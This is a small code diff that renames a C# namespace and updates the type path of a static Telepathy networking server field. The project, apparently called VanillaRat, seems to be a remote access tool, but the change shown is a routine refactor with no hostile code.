@@ -1,7 +1,7 @@
-﻿namespace VanillaRat.Classes
+﻿namespace Server
 {
     public static class Server
     {
-        public static Telepathy.Server MainServer = new Telepathy.Server();
+        public static Helpers.Telepathy.Server MainServer = new Helpers.Telepathy.Server();
     }
 }
